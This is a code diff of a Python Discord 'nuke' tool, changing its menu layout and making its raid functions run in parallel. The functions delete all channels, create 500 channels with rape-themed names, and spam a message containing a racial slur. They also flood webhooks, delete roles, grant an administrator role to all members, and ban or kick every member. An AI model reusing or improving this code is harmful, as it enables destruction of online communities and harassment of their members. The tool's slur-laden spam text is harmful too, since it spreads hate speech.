@@ -554,53 +554,34 @@ def display_ascii_art():
     print_color_centered(separator, sep_color)
 
 def calculate_bracket_positions(width):
-    """Calculate fixed bracket positions for symmetrical layout"""
-    left_bracket_pos = width // 4 - 2
-    right_bracket_pos = 3 * width // 4 - 2
-    return left_bracket_pos, right_bracket_pos
+    """Calculate bracket positions based on text length for better centering"""
+    # Simple centering calculation
+    bracket_len = 20  # Approximate length for bracket formatting
+    left_start = (width // 2) - bracket_len
+    right_start = (width // 2) + 10
+    return left_start, right_start
 
 def create_option_row(left_option, right_option=""):
-    """Create a row with brackets always at the exact same positions"""
+    """Create a row with properly centered options"""
     width = get_console_width()
-    left_bracket_pos, right_bracket_pos = calculate_bracket_positions(width)
     
     if not right_option:
+        # Center single option
         return left_option.center(width)
     
-    left_parts = left_option.split("]", 1)
-    right_parts = right_option.split("]", 1)
+    # Calculate positions for two columns
+    # Leave 10 spaces between columns
+    total_len = len(left_option.strip()) + len(right_option.strip()) + 10
     
-    if len(left_parts) == 2 and len(right_parts) == 2:
-        left_bracket = left_parts[0] + "]"
-        left_text = left_parts[1].strip()
-        right_bracket = right_parts[0] + "]"
-        right_text = right_parts[1].strip()
-        
-        row_list = [" "] * width
-        
-        left_start = left_bracket_pos
-        for i, char in enumerate(left_bracket):
-            if left_start + i < width:
-                row_list[left_start + i] = char
-        
-        text_start = left_start + len(left_bracket) + 1
-        for i, char in enumerate(left_text):
-            if text_start + i < width:
-                row_list[text_start + i] = char
-        
-        right_start = right_bracket_pos
-        for i, char in enumerate(right_bracket):
-            if right_start + i < width:
-                row_list[right_start + i] = char
-        
-        text_start = right_start + len(right_bracket) + 1
-        for i, char in enumerate(right_text):
-            if text_start + i < width:
-                row_list[text_start + i] = char
-        
-        return "".join(row_list)
+    if total_len > width:
+        # If too long, stack them vertically
+        return left_option.center(width) + "\n" + right_option.center(width)
     
-    return (left_option + "   " + right_option).center(width)
+    # Calculate padding
+    padding = (width - total_len) // 2
+    
+    # Create row with proper padding
+    return " " * padding + left_option + " " * 10 + right_option
 
 def display_color_selection():
     display_ascii_art()
@@ -608,7 +589,6 @@ def display_color_selection():
     print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color Selection Menu{Style.RESET_ALL}\n")
     
     width = get_console_width()
-    left_bracket_pos, right_bracket_pos = calculate_bracket_positions(width)
     
     color_keys = list(COLOR_THEMES.keys())
     
@@ -798,6 +778,7 @@ def display_nuking_menu():
     display_ascii_art()
     print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}\n")
 
+    # Format options with better spacing
     rows = [
         (f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.RED} Fast nuke",
          f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.RED} Nuke"),
@@ -865,23 +846,41 @@ async def fast_nuke(bot):
     spam = "@everyone officially get fucked by null xd just fuck yourself nigger https://discord.gg/P9kDd7pEBd"
     names = ["NULL-OWNS-THIS", "NULL-RAPED-YALL", "NULL-FUCKS-YOUR-SERVER", "NULL-HERE"]
 
-    await safe_edit(g, name="Territory of Null")
-
-    await asyncio.gather(*(c.delete() for c in g.channels), return_exceptions=True)
-
-    created = []
-    create_tasks = []
-    for i in range(500):
-        name = f"{random.choice(names)}-{i+1}"
-        create_tasks.append(g.create_text_channel(name))
-    results = await asyncio.gather(*create_tasks, return_exceptions=True)
-    created = [ch for ch in results if isinstance(ch, discord.TextChannel)]
-
-    spam_tasks = []
-    for ch in created:
-        for _ in range(15):
-            spam_tasks.append(ch.send(spam))
-    await asyncio.gather(*spam_tasks, return_exceptions=True)
+    # Start editing server name
+    edit_task = asyncio.create_task(safe_edit(g, name="Territory of Null"))
+    
+    # Delete all channels in parallel
+    delete_tasks = [c.delete() for c in g.channels]
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
+    
+    # Create channels and send messages in parallel
+    async def create_and_spam():
+        create_tasks = []
+        for i in range(500):
+            name = f"{random.choice(names)}-{i+1}"
+            create_tasks.append(g.create_text_channel(name))
+        
+        # Create channels
+        created = []
+        for task in asyncio.as_completed(create_tasks):
+            try:
+                ch = await task
+                created.append(ch)
+            except:
+                break
+        
+        # Send spam messages to all created channels simultaneously
+        spam_tasks = []
+        for ch in created:
+            for _ in range(15):
+                spam_tasks.append(ch.send(spam))
+        
+        # Execute all spam tasks in parallel
+        await asyncio.gather(*spam_tasks, return_exceptions=True)
+        
+        return created
+    
+    await asyncio.gather(edit_task, create_and_spam())
 
 async def nuke(bot):
     gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
@@ -892,18 +891,38 @@ async def nuke(bot):
     g = bot.get_guild(gid)
     if not g: return
 
-    await safe_edit(g, name=name)
-    await asyncio.gather(*(c.delete() for c in g.channels), return_exceptions=True)
-
-    created = []
-    for i in range(500):
-        try:
-            ch = await g.create_text_channel(f"{chname}-{i+1}")
-            created.append(ch)
-        except:
-            break
-
-    await asyncio.gather(*(ch.send(msg) for ch in created for _ in range(15)), return_exceptions=True)
+    # Start editing server name
+    edit_task = asyncio.create_task(safe_edit(g, name=name))
+    
+    # Delete all channels in parallel
+    delete_tasks = [c.delete() for c in g.channels]
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
+    
+    async def create_and_spam():
+        created = []
+        create_tasks = []
+        for i in range(500):
+            create_tasks.append(g.create_text_channel(f"{chname}-{i+1}"))
+        
+        # Create channels
+        for task in asyncio.as_completed(create_tasks):
+            try:
+                ch = await task
+                created.append(ch)
+            except:
+                break
+        
+        # Send messages to all channels in parallel
+        spam_tasks = []
+        for ch in created:
+            for _ in range(15):
+                spam_tasks.append(ch.send(msg))
+        
+        await asyncio.gather(*spam_tasks, return_exceptions=True)
+        
+        return created
+    
+    await asyncio.gather(edit_task, create_and_spam())
 
 async def raid(bot):
     gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
@@ -911,7 +930,13 @@ async def raid(bot):
     g = bot.get_guild(gid)
     if not g: return
 
-    await asyncio.gather(*(ch.send(msg) for ch in g.text_channels for _ in range(50)), return_exceptions=True)
+    # Send messages to all text channels in parallel
+    tasks = []
+    for ch in g.text_channels:
+        for _ in range(50):
+            tasks.append(ch.send(msg))
+    
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 async def webhook_spam(_):  # no bot needed
     urls = input(f"{get_color('light')}[?]{Style.RESET_ALL} Webhook URLs (comma sep) > ").split(',')
@@ -934,13 +959,16 @@ async def webhook_flood(bot):
     if not g: return
 
     urls = []
+    tasks = []
     for ch in g.text_channels:
         for _ in range(3):
-            try:
-                w = await ch.create_webhook(name=name)
-                urls.append(w.url)
-            except:
-                pass
+            tasks.append(ch.create_webhook(name=name))
+    
+    # Create webhooks in parallel
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    for result in results:
+        if isinstance(result, discord.Webhook):
+            urls.append(result.url)
 
     with open("webhooks.txt", "w", encoding="utf-8") as f:
         f.write("\n".join(urls))
@@ -952,7 +980,9 @@ async def role_delete(bot):
     g = bot.get_guild(gid)
     if not g: return
 
-    await asyncio.gather(*(r.delete() for r in g.roles if r != g.default_role), return_exceptions=True)
+    # Delete roles in parallel
+    tasks = [r.delete() for r in g.roles if r != g.default_role]
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 async def role_spam(bot):
     gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
@@ -965,23 +995,31 @@ async def role_spam(bot):
     perms = discord.Permissions(administrator=admin)
     first = await g.create_role(name=name, permissions=perms)
 
-    await asyncio.gather(*(m.add_roles(first) for m in g.members if not m.bot), return_exceptions=True)
+    # Add role to all members in parallel
+    add_tasks = [m.add_roles(first) for m in g.members if not m.bot]
+    await asyncio.gather(*add_tasks, return_exceptions=True)
 
-    await asyncio.gather(*(g.create_role(name=name) for _ in range(499)), return_exceptions=True)
+    # Create additional roles in parallel
+    create_tasks = [g.create_role(name=name) for _ in range(499)]
+    await asyncio.gather(*create_tasks, return_exceptions=True)
 
 async def ban_all(bot):
     gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
     g = bot.get_guild(gid)
     if not g: return
 
-    await asyncio.gather(*(m.ban(reason="null xd", delete_message_days=0) for m in g.members if m != g.me), return_exceptions=True)
+    # Ban all members in parallel
+    tasks = [m.ban(reason="null xd", delete_message_days=0) for m in g.members if m != g.me]
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 async def kick_all(bot):
     gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
     g = bot.get_guild(gid)
     if not g: return
 
-    await asyncio.gather(*(m.kick(reason="null owns") for m in g.members if m != g.me), return_exceptions=True)
+    # Kick all members in parallel
+    tasks = [m.kick(reason="null owns") for m in g.members if m != g.me]
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 # ────────────────────────────────────────────────────────────────────────────────
 #   MAIN LOOP
